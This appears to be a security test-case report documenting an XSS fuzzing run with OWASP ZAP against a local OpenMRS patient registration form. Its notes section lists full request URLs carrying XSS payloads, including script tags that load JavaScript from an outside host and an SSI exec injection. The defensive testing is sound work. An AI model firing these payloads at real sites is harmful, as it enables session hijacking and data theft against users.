# Fuzz -2- PATIENT REGISTRATION PAGE XSS
### Priority : HIGH
### Test status : PASSED
`DESIGNER : TAM N NGUYEN` <br/>
`EXECUTED BY : TAM N NGUYEN` <br/>
`UPDATED ON : 20OCT17` <br/>
`EXECUTED ON : 20OCT17` <br/>

### * Description
#### Name of module : OpenMRS Patient registration page at http://localhost:8081/openmrs-standalone/registrationapp/registerPatient.page
(to be developed)

### * Precondition
1. A local computer with administrator privilege
2. Java JRE installed
3. OpenMRS Standalone Version 2.6.0 downloaded and unziped
4. OWASP ZAP Version 2.6.0 downloaded and installed

### * Dependencies
1. OpenMRS with demo database was loaded and runs normally
2. OWASP ZAP runs normally

### * Test Data
jbrofuzz XSS rules came standard with OWASP Zap

### * Test steps
1. Open up OpenMRS V. 2.6.0 Standalone. Make sure Tomcat Port is 8081 and MySQL port is 3316. A web page starting with localhost:8081 will be automatically opened upon successful start.

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/portSettings.png)

2. Open OWASP Zap V2.6.0
3. From OWASP Zap, go to Toos > Launch the Zap JxBrowser
4. In the Zap JxBrowser, type "http://localhost:8081/openmrs-standalone/login.htm" (without the double quotes) into the address bar and hit Enter
5. Go to the main Zap window, on the left side bar, in "Sites" tab, under "Sites" sub section, you will now see "http://localhost:8081". Expand that until you see "GET:login.htm". If you don't see it, please go to the JzBrowser and make sure the login page is loaded. If the page is not loaded, you need to double check the OpenMRS to make sure it runs properly

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/sitesLoaded.png)

6. Go back to the Zap JxBrowser and login with Username: admin and Password : Admin123 (password is case sensitive) and select "Pharmacy" as section.
7. After logged in, choose "Register a patient"
8. Fill out patient information as followed
Demographics:
- Name: Lawren Jennifer
- Gender: Female
- Birthdate: Estimate years : 25 / Estimate months : 1
- Address: Fuzz Fuzz Fuzz Fuzz
- Address2: bogus
- City: Hollywood
- State: CA / Country: USA / Postal Code: 00000
- Phone: 408 804 4488
- Relatives: Doctor / Nguyen
9. Confirm the information - Click "Confirm". Close JxBrowser window and get back to main Zap window

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/patientInfo.png)

10. In zap window, if you see "registrationapp" on the left panel (the "Sites" panel) then you got it, if not, please repeat step 3 to 8
11. Expand "registrationapp", then expand "registerPatient", and select "GET:submit.action(,address1, address2appid, birthdate..."
12. The right panel will turn into 2 smaller panels. At the top panel, you will see the HTML header of the GET request sent when registering for the patient. Look for the "Fuzz+Fuzz+Fuzz+Fuzz" string.

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/locateFuzzFuzz.png)

9. Highlight the "Fuzz+Fuzz+Fuzz+Fuzz" part from the string you got in previous step, right click on it and choose "Fuzz". A Fuzzer window will be opened.

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/fuzzFuzzWindow.png)

10. In the fuzzer window, click "Payloads..." button. A child window will be opened
11. In the child "Payloads" window, click "Add". An "Add payload" window will be opened
12. In "Add payload window, in the "Type" box, choose "File Fuzzers". Expand the "jbrofuzz" section. Check the box of "XSS" and click "Add". The child window will be closed.

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/patientInfo.png)

13. In Payloads window, click "OK" and you will be returned to the "Fuzzer" window. In this window, click "Start Fuzzer" button and you will be returned to the main Zap window with the "Fuzzer" tab selected
14. Observe the results in the "Fuzzer" tab, especially the "Code" collumn. You will see that some payloads got through by noticing html code 200. Select one fuzz entry with status code 200 and observe the HtmlResponse information. We will see that the system actually let the fuzzer register a patient with mallicious payloads, noting the OpenMRS responded with a "success" status and a new patient ID.

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/fuzzFuzzResults.png)

15. Open your regular browser, login with admin as username and "Admin123" as password. Go to http://localhost:8081/openmrs-standalone/coreapps/findpatient/findPatient.page?app=coreapps.findPatient
16. Type in either "Jennifer Lauren" and you will see that besides the original "Jennifer Lauren" that we created, there are bogus entries (31) that were created successfully by the fuzzer. We can then verify each bogus entry by clicking on each one, and expand the "show contact info" to see if mallicious code can be executed.

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/fuzzFuzzVerification.png)


### * Expected results
+ System fail securely
+ No user should be created successfully with mallicious payload as input OR if a user was created with mallicious inputs, contents of mallicious payloads must be deleted or escaped as plain text.

### * Post-condition
OpenMRS should still be operate normally

### * Actual results
+ 223 attacks were performed
+ Around 31 attacks got accepted by the system, the rest were recognized and denied by 400 code
+ Around 31 new patients with the same name "Jennifer Lawren" were created but all mallicious payloads were escaped/deletted.
+ 08 failed attacks were responded with HibernateException messages. However, since the deployment of Hybernate is open knowledge and the error messages did not reveal any important information about the error, we decided that those cases were "failed secure" cases. URLs of the cases are included in the Notes section for further inspections.

### * NOTES:
URL requests that caused HibernateException errors.
```
http://localhost:8081/openmrs-standalone/registrationapp/registerPatient/submit.action?appId=referenceapplication.registrationapp.registerPatient&&givenName=Jennifer&middleName=&familyName=Lawren&preferred=true&gender=F&unknown=false&birthdateDay=&birthdateMonth=&birthdateYear=&birthdateYears=25&birthdateMonths=1&birthdate=&address1=&%2360;IMG%20STYLE&%2361;&%2334;xss&%2358;expr&%2347;&%2342;XSS&%2342;&%2347;ession&%2340;alert&%2340;&%2339;XSS&%2339;&%2341;&%2341;&%2334;&%2362;&address2=bogus&cityVillage=Hollywood&stateProvince=CA&country=usA&postalCode=00000&phoneNumber=408+804+4488&relationship_type=8d919b58-c2cc-11de-8d13-0010c6dffd0f-A&other_person_uuid=

http://localhost:8081/openmrs-standalone/registrationapp/registerPatient/submit.action?appId=referenceapplication.registrationapp.registerPatient&&givenName=Jennifer&middleName=&familyName=Lawren&preferred=true&gender=F&unknown=false&birthdateDay=&birthdateMonth=&birthdateYear=&birthdateYears=25&birthdateMonths=1&birthdate=&address1=&%2360;STYLE&%2362;&%2364;import&%2339;http&%2358;&%2347;&%2347;testsite.com&%2347;xss.css&%2339;&%2359;&%2360;&%2347;STYLE&%2362;&address2=bogus&cityVillage=Hollywood&stateProvince=CA&country=usA&postalCode=00000&phoneNumber=408+804+4488&relationship_type=8d919b58-c2cc-11de-8d13-0010c6dffd0f-A&other_person_uuid=

http://localhost:8081/openmrs-standalone/registrationapp/registerPatient/submit.action?appId=referenceapplication.registrationapp.registerPatient&&givenName=Jennifer&middleName=&familyName=Lawren&preferred=true&gender=F&unknown=false&birthdateDay=&birthdateMonth=&birthdateYear=&birthdateYears=25&birthdateMonths=1&birthdate=&address1=&%2360;IMG%20SRC&%2361;&%2334;jav&%2338;&%2335;x0D&%2359;ascript&%2358;alert&%2340;&%2339;XSS&%2339;&%2341;&%2359;&%2334;&%2362;&address2=bogus&cityVillage=Hollywood&stateProvince=CA&country=usA&postalCode=00000&phoneNumber=408+804+4488&relationship_type=8d919b58-c2cc-11de-8d13-0010c6dffd0f-A&other_person_uuid=

http://localhost:8081/openmrs-standalone/registrationapp/registerPatient/submit.action?appId=referenceapplication.registrationapp.registerPatient&&givenName=Jennifer&middleName=&familyName=Lawren&preferred=true&gender=F&unknown=false&birthdateDay=&birthdateMonth=&birthdateYear=&birthdateYears=25&birthdateMonths=1&birthdate=&address1=%3C!--%23exec%20cmd=%22/bin/echo%20'%3CSCRIPT%20SRC'%22--%3E%3C!--%23exec%20cmd=%22/bin/echo%20'=http://ha.ckers.org/xss.js%3E%3C/SCRIPT%3E'%22--%3E&address2=bogus&cityVillage=Hollywood&stateProvince=CA&country=usA&postalCode=00000&phoneNumber=408+804+4488&relationship_type=8d919b58-c2cc-11de-8d13-0010c6dffd0f-A&other_person_uuid=

http://localhost:8081/openmrs-standalone/registrationapp/registerPatient/submit.action?appId=referenceapplication.registrationapp.registerPatient&&givenName=Jennifer&middleName=&familyName=Lawren&preferred=true&gender=F&unknown=false&birthdateDay=&birthdateMonth=&birthdateYear=&birthdateYears=25&birthdateMonths=1&birthdate=&address1=httP://aa%22%3E%3Cscript%3Ealert(123)%3C/script%3E&address2=bogus&cityVillage=Hollywood&stateProvince=CA&country=usA&postalCode=00000&phoneNumber=408+804+4488&relationship_type=8d919b58-c2cc-11de-8d13-0010c6dffd0f-A&other_person_uuid=

http://localhost:8081/openmrs-standalone/registrationapp/registerPatient/submit.action?appId=referenceapplication.registrationapp.registerPatient&&givenName=Jennifer&middleName=&familyName=Lawren&preferred=true&gender=F&unknown=false&birthdateDay=&birthdateMonth=&birthdateYear=&birthdateYears=25&birthdateMonths=1&birthdate=&address1=%3CEMBED%20SRC=%22http://ha.ckers.org/xss.swf%22%20AllowScriptAccess=%22always%22%3E%3C/EMBED%3E&address2=bogus&cityVillage=Hollywood&stateProvince=CA&country=usA&postalCode=00000&phoneNumber=408+804+4488&relationship_type=8d919b58-c2cc-11de-8d13-0010c6dffd0f-A&other_person_uuid=

http://localhost:8081/openmrs-standalone/registrationapp/registerPatient/submit.action?appId=referenceapplication.registrationapp.registerPatient&&givenName=Jennifer&middleName=&familyName=Lawren&preferred=true&gender=F&unknown=false&birthdateDay=&birthdateMonth=&birthdateYear=&birthdateYears=25&birthdateMonths=1&birthdate=&address1=%3CSCRIPT/XSS%20SRC=%22http://ha.ckers.org/xss.js%22%3E%3C/SCRIPT%3E&address2=bogus&cityVillage=Hollywood&stateProvince=CA&country=usA&postalCode=00000&phoneNumber=408+804+4488&relationship_type=8d919b58-c2cc-11de-8d13-0010c6dffd0f-A&other_person_uuid=

http://localhost:8081/openmrs-standalone/registrationapp/registerPatient/submit.action?appId=referenceapplication.registrationapp.registerPatient&&givenName=Jennifer&middleName=&familyName=Lawren&preferred=true&gender=F&unknown=false&birthdateDay=&birthdateMonth=&birthdateYear=&birthdateYears=25&birthdateMonths=1&birthdate=&address1=res://c:%5C%5Cprogram%20files%5C%5Cadobe%5C%5Cacrobat%207.0%5C%5Cacrobat%5C%5Cacrobat.dll/%232/%23210&address2=bogus&cityVillage=Hollywood&stateProvince=CA&country=usA&postalCode=00000&phoneNumber=408+804+4488&relationship_type=8d919b58-c2cc-11de-8d13-0010c6dffd0f-A&other_person_uuid=
```
